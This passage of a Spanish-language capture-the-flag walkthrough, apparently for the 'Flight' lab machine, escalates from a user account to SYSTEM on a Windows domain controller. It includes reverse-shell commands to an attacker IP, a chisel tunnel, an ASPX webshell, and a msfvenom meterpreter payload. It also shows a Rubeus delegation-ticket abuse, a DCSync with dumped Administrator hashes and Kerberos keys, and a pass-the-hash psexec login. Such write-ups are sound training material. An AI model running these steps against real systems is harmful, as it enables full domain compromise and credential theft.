  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2672
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       504
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1220
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1596
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:49682          0.0.0.0:0              LISTENING       644
  TCP    0.0.0.0:49694          0.0.0.0:0              LISTENING       2748
  TCP    0.0.0.0:49719          0.0.0.0:0              LISTENING       2760
  TCP    10.10.11.187:53        0.0.0.0:0              LISTENING       2748
  TCP    10.10.11.187:139       0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2748
```

Ahora podriamos usar `RunasCs.exe` para invocar una `cmd.exe` y asi poder redirigir el STDIN/STDOUT a mi maquina. Primero nos descargamos en la maqina victima.

```
C:\ProgramData>powershell -c wget 10.10.14.6/RunasCs.exe -Outfile RunasCs.exe
```

Y con el `nc` en escucha en mi maquina ejecuto el comando.

```cmd
C:\ProgramData>.\RunasCs.exe C.Bum Tikkycoll_431012284 -r 10.10.14.6:443 cmd
[*] Warning: Using function CreateProcessWithLogonW is not compatible with logon type 8. Reverting to logon type Interactive (2)...
[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-5ea78$\Default
[+] Async process 'cmd' with pid 4508 created and left in background.
```

```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.187] 50363
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
flight\c.bum

C:\Windows\system32>whoami
```

# Shell as `defaultapppoll`

Una vez siendo `c.bum` usamos `chisel` para poder acceder al puerto `8000` de la maquina y ver que es lo que hay ahi.

Iniciamos un servidor desde nuestra maquina.

```bash
./chisel server -p 8000 -reverse
2025/10/10 02:01:23 server: Reverse tunnelling enabled
2025/10/10 02:01:23 server: Fingerprint PvaxOFvxPNuMdfJLoeKlLVXmheQPGaXKzFlRUcMpR+o=
2025/10/10 02:01:23 server: Listening on http://0.0.0.0:8000
2025/10/10 02:03:00 server: session#1: Client version (1.11.3) differs from server version (1.10.1)
2025/10/10 02:03:00 server: session#1: tun: proxy#R:8001=>8000: Listening
```


Y desde la maqiuna victima nos conectamos en modo cliente.

```powershell
PS C:\ProgramData> .\chisel.exe client 10.10.16.2:8000 R:8001:127.0.0.1:8000
.\chisel.exe client 10.10.16.2:8000 R:8001:127.0.0.1:8000
2025/10/10 06:02:57 client: Connecting to ws://10.10.16.2:8000
2025/10/10 06:03:00 client: Connected (Latency 188.0828ms)
```

![[Untitled 53 1.jpg]]

Vemos que si, es otra pagina web. Y visualizando mas el codigo.

```
HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 16 Apr 2018 21:23:22 GMT
Accept-Ranges: bytes
ETag: "019c25c9d5d31:0"
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Wed, 26 Oct 2022 01:47:57 GMT
Connection: close
Content-Length: 9371
```

Vemos que se usa ASP.NET, el cual significa que se deben utilizar archivos `.aspx` como se hace siempre.
Podriamos desde la conexion por `smb` subir un `cmdasp.aspx` y desde la consola como `c.bum` moverlo al directorio `development`

```powershell
PS C:\inetpub\development> copy \xampp\htdocs\school.flight.htb\images\cmdasp.aspx .
copy \xampp\htdocs\school.flight.htb\images\cmdasp.aspx .
PS C:\inetpub\development> ls
ls


    Directory: C:\inetpub\development


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       10/10/2025   6:12 AM                development                                                           
-a----       10/10/2025   6:12 AM           1400 cmdasp.aspx
```

![[Untitled 54 1.jpg]]

Podriamos generar un `.exe` que nos envie una `revshell` a nuestro equipo con `msf` y asi ejecutarlo y recibir una shell como `defaultapppoll`.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.2 LPORT=2222 -f exe -o pay.exe        
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: pay.exe
```

Y ahora nos configuramos el listener con metasploit.

```bash
 msfconsole -q                                                                                
msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 10.10.16.2
lhost => 10.10.16.2
msf exploit(multi/handler) > set lport 2222
lport => 2222
msf exploit(multi/handler) > run
```

Ahora movemos hacemos el mismo movimiento para subir el `pay.exe` a la maquina de `c.bum`.

```powershell
PS C:\inetpub\development> move C:\xampp\htdocs\school.flight.htb\images\pay.exe C:\ProgramData\pay.exe
move C:\xampp\htdocs\school.flight.htb\images\pay.exe C:\ProgramData\pay.exe
```

Y ejecutamos el binario.

![[Untitled 55 1.jpg]]

Y es asi como ganamos acceso como el usuario.

```bash
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.16.2:2222 
[*] Sending stage (203846 bytes) to 10.10.11.187
[*] Meterpreter session 1 opened (10.10.16.2:2222 -> 10.10.11.187:50470) at 2025-10-10 02:26:46 -0400

meterpreter > shell
Process 1932 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```

>`iis apppool\defaultapppool` en si no es peligroso de poseerlo ya que es una `Identidad local` y se ejecuta como una cuenta virtual y debido a esto sus permisos son bajos y limitados pero a nivel de `Identidad en la red` si es peligroso ya que cuando **autentica sobre la red, lo hace como la Cuenta de Máquina del servidor (`NOMBRE_DE_MÁQUINA$`)** en este caso lo hace como `flight\G0$`.

Una manera de aprovechar esto es crear un ticket con `Rubeus.exe` usando el comando `tgtdeleg` lo que nos crea un `.kirbi` pero en `base64`.

```powershell
PS C:\programdata> .\Rubeus.exe tgtdeleg /nowrap       
.\Rubeus.exe tgtdeleg /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/g0.flight.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: bqE6lsrUMwwZ4uI67YRtPYyy3Ed50EVlNgY7wRspqQg=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIEClcs3Go5wt9gigrsgTsxovmUuYojb6XVjA9YWgdDaG6cr9IqrFKQcKe9WvJX0dHNwq4BIUe12Aj0k48hGPGc/8biJnij0z9ydyzbzqfU6WqvpawZztP5qxTZkJwkrhfipF0lLT6nCFIyK/ucHvxkr3qpzipLCtqLfVArMDRHcOv5VpF1+3yQcxlm7xOPTjsU7di2rv+ax2/fJXSLhRIer0U1WCnLdrrN/aGB7CerqZS6qANKI/z4T3xykl2zOjJN4HlHL2w6im0Lo+BglxBtG0f+BoYDiBv/2S5C+dO3kwtCJGCpFKnoB5v53OIEFF6iPnTnfV6k8DyTc56asJS8Ix5802af6E3DevhlPCDJVqAJc+k8SOsYy5cKuBivjoV38wC312huk48SAaeoPGHOWa21GkMUBZYG+b22FNlxbKgKgGZ835eqP1/6NZjY2c1fZEtFkKuFCWXFDkji8SkaIfdmQg04jscI6AxJ9kTtWt8aR55Dkj6++oG2ZYm9nM0DoLw9zc8PRrLZRjvQY6DTM7j4xMsZLJgUzI9baRjq6y8suLp+8vTnOhrlQgc9iZAyQFJxi9NwicITGi/VwUwFecd0d9guDKqSHgARj5yDi+5FWzBuiFIE2iPOujJehWUhbpI3wsYFVKxP8HAfTAZSkYMZYFjUmkgg6iQ3ViIosbDpei4NrzGfuo6CCFfNx4Dz5kCJ5NxVsqWFc8DBvTHNykPjoibWBTLlsjX1SW1cwkYnPU6/4RLDnVdMXN4tt6Qa/Eh7q7ynqkjHjZJBc80SUSUFgdGvk/T+IFqFi/d4qjDZi9oFeH6VDNbzDswKbhPSiHZN0VdcqZyurHZYTqxyoV2tTOZuiVaD/p1unu+ZYYBJ7u+X2DNcadcA2rVmnkSKImZ2oxkplueOlL+Qrpay+W3/Y7mR9dQMqX3/dHkh/nyrQejA3S1oHWM03feSo74c8sESN9GGjPz5Vi8untbjboUv2KA4fWEKFDw8Z/uX2HPHlAYslO2oiwag66dmLmAT757XP3P+aated3F3mVawRHRjXqzgvxSgQLlQc5uJDE61AqYLC7Ro78ZVBssLm8g3Cf5u3ORr7RlUnJpFvNvji55Zmk+p22HhvyAON2ASnmln0KDBQD470Y4LQd9T34ZuDoMLS7n+3qu6hkZ+Gvp5ELzgcSqpKY1HJB6q2k9yFd4LeCR7vTceMaz1uYw/ASsGb79xZ82ADEpwLNw0Lmdnwdi2CzFT793ZYg/Ig44WE1RSnY8ydS+MKrfi00OVJVrcUbKA/nEsbRHyEZyFr2MzPqlGzjbum26jaxXcAASLq5Pc06tX7K4bzkwlDgfBfF5G0SXg6n5eiTSYwDvcyoS4JEkFAIWG0lffHXZOo4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQgblftK26bL6s4nTs05gB0NsH2JzRM5vMGgQHkZtBd0yyhDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMAUbA0cwJKMHAwUAYKEAAKURGA8yMDI1MTAxMDEzMjkwNFqmERgPMjAyNTEwMTAyMzI5MDRapxEYDzIwMjUxMDE3MTMyOTA0WqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC
```

Una vez teniendo el contenido en `base64`, en nuestra maquina lo decodificamos y lo depostivamos en un archivo `.kirbi`.

```bash
nvim hash.b64                                                                                            
cat hash.b64 | base64 -d > hash.kirbi 
```

Y ahora con `ticketConverter` de `impacket`. lo convertimos a un `.ccache` para luego poder usar la autenticacion `kerberos` y perfomar un `DCSync` contra el dominio.

```bash
impacket-ticketConverter hash.kirbi defaultapppool.ccache                                                                  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```

Y ahora con `secretsdump` de impacket, realizamos el ataque.

```bash
impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user Administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:08c3eb806e4a83cdc660a54970bf3f3043256638aea2b62c317feffb75d89322
Administrator:aes128-cts-hmac-sha1-96:735ebdcaa24aad6bf0dc154fcdcb9465
Administrator:des-cbc-md5:c7754cb5498c2a2f
[*] Cleaning up...
```

Y una vez teniendo el hash del administrador nos conectamos con `psexec` tambien de impacket.

```bash
impacket-psexec flight.htb/Administrator@10.10.11.187 -hashes :43bbfc530bab76141b12c8446e30c17c
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.11.187.....
[*] Found writable share ADMIN$
[*] Uploading file gFHDedel.exe
[*] Opening SVCManager on 10.10.11.187.....
[*] Creating service UZTz on 10.10.11.187.....
[*] Starting service UZTz.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

`~Happy Hacking.`
